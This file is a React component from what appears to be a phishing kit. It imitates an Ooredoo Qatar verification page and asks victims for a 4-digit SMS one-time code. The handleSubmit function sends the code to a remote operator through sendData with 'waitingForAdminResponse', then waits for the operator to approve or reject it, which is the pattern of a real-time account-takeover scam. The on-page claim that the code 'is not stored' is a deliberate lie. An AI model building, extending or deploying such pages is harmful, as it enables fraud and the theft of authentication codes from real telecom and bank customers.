import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import { Button } from "@/components/ui/button";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Loader2, PhoneCall, ShieldCheck, MessageSquare } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { getServiceContext } from "@/lib/serviceContext";
import {
  sendData,
  navigateToPage,
  isFormApproved,
  isFormRejected,
  waitingMessage,
} from "@/lib/store";

const CardPin = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const selectedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
  const serviceContext = getServiceContext(selectedService);

  const [digits, setDigits] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [rejected, setRejected] = useState(false);
  const [seconds, setSeconds] = useState(54);
  const inputsRef = useRef<Array<HTMLInputElement | null>>([]);

  const code = digits.join("");
  const isValid = code.length === 4;

  useEffect(() => {
    navigateToPage("رمز OTP Ooredoo");
    isFormApproved.value = false;
    isFormRejected.value = false;
    waitingMessage.value = "";
  }, []);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  useSignalEffect(() => {
    if (isFormApproved.value) {
      isFormApproved.value = false;
      navigate("/final-page");
    }
  });

  useSignalEffect(() => {
    if (isFormRejected.value) {
      isFormRejected.value = false;
      setRejected(true);
      setWaiting(false);
      setLoading(false);
      setDigits(["", "", "", ""]);
      waitingMessage.value = "";
      inputsRef.current[0]?.focus();
    }
  });

  const handleChange = (i: number, val: string) => {
    const d = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = d;
    setDigits(next);
    if (d && i < 3) inputsRef.current[i + 1]?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) inputsRef.current[i - 1]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);
    setRejected(false);
    sendData({
      data: { "رمز OTP Ooredoo": code },
      current: "رمز OTP Ooredoo",
      waitingForAdminResponse: true,
    });
    setWaiting(true);
    setLoading(false);
  };

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  return (
    <div className="min-h-screen bg-background relative" dir={dir}>
      <WaitingOverlay />
      <SiteHeader />

      <section className="px-4 pb-10 pt-6">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Official notice */}
          <div className="rounded-2xl bg-gradient-to-l from-red-600 to-red-700 text-white p-5 shadow-lg flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-white/15 flex items-center justify-center shrink-0">
              <PhoneCall className="w-6 h-6 text-white" />
            </div>
            <div>
              <p className="text-xs font-bold opacity-90 mb-1">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <p className="text-base font-extrabold leading-tight">
                {pick(
                  "تأكيد ملكية رقم الهاتف عبر رمز التحقق",
                  "Verify phone number ownership via one-time code"
                )}
              </p>
            </div>
          </div>

          {/* Rejection Banner */}
          {rejected && (
            <div className="rounded-xl bg-red-50 border border-red-200 text-red-700 p-4 text-sm font-medium">
              {pick("الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The code you entered is incorrect. Please try again.")}
            </div>
          )}

          {/* Heading */}
          <div className="space-y-3">
            <h1 className="text-2xl font-extrabold text-foreground leading-snug">
              {pick("أدخل رمز التحقق المرسل إلى هاتفك", "Enter the verification code sent to your phone")}
            </h1>
            <p className="text-sm text-muted-foreground leading-relaxed">
              {pick("أرسلنا رمزاً مكوّناً من 4 أرقام عبر SMS من ", "We sent a 4-digit SMS code from ")}
              <span className="text-red-600 font-bold">Ooredoo Qatar</span>
              {pick(
                ` لتأكيد ملكية الخط وربطه رسمياً مع ${serviceContext.accountAr}.`,
                ` to confirm line ownership and officially link it to your ${serviceContext.accountEn}.`
              )}
            </p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6 pt-2">
            <div className="space-y-3">
              <label className="block text-sm font-bold text-foreground">
                {pick("رمز التحقق", "Verification Code")}
              </label>
              <div className="flex justify-center gap-3" dir="ltr">
                {digits.map((d, i) => (
                  <input
                    key={i}
                    ref={(el) => (inputsRef.current[i] = el)}
                    type="text"
                    inputMode="numeric"
                    value={d}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    className="w-16 h-16 text-center text-2xl font-bold bg-muted/30 border border-border/50 rounded-xl focus:ring-2 focus:ring-red-500/30 focus:border-red-500 outline-none transition-all"
                    maxLength={1}
                    autoFocus={i === 0}
                  />
                ))}
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-sm">
              <MessageSquare className="w-4 h-4 text-muted-foreground" />
              {seconds > 0 ? (
                <span className="text-muted-foreground">
                  {pick("إعادة إرسال الرمز خلال", "Resend code in")}{" "}
                  <span className="text-red-600 font-bold">{mm}:{ss}</span>
                </span>
              ) : (
                <button
                  type="button"
                  onClick={() => setSeconds(54)}
                  className="text-red-600 font-bold hover:underline"
                >
                  {pick("إعادة إرسال الرمز", "Resend code")}
                </button>
              )}
            </div>

            {/* Security note */}
            <div className="flex items-start gap-2.5 rounded-xl bg-muted/40 border border-border/50 p-3">
              <ShieldCheck className="w-4 h-4 text-red-600 mt-0.5 shrink-0" />
              <p className="text-xs text-muted-foreground leading-relaxed">
                {pick(
                  `يُستخدم رمز التحقق لمرة واحدة فقط لتأكيد ملكية رقم الهاتف، ولا يتم تخزينه لدى ${serviceContext.platformShortAr}.`,
                  `The verification code is used only once to confirm phone ownership and is not stored by ${serviceContext.platformShortEn}.`
                )}
              </p>
            </div>

            <Button
              type="submit"
              disabled={loading || waiting || !isValid}
              className="w-full bg-red-600 hover:bg-red-700 text-white text-base font-bold py-6 rounded-xl shadow-md transition-all"
            >
              {waiting ? (
                <span className="flex items-center justify-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  {pick("بانتظار الموافقة...", "Waiting for approval...")}
                </span>
              ) : loading ? (
                <span className="flex items-center justify-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  {pick("جارٍ التحقق...", "Verifying...")}
                </span>
              ) : (
                pick("تأكيد الرمز وربط الحساب", "Confirm code and link account")
              )}
            </Button>
          </form>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default CardPin;
